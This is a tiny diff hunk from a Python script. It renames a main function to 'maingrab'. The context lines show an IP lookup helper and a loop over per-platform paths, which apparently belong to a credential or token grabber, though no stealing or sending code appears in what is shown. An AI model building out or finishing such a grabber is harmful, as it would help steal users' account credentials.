@@ -87,7 +87,7 @@ def getip():
     except:
         return "None"
 
-def main():
+def maingrab():
     checked = []
 
     for platform, path in PATHS.items():
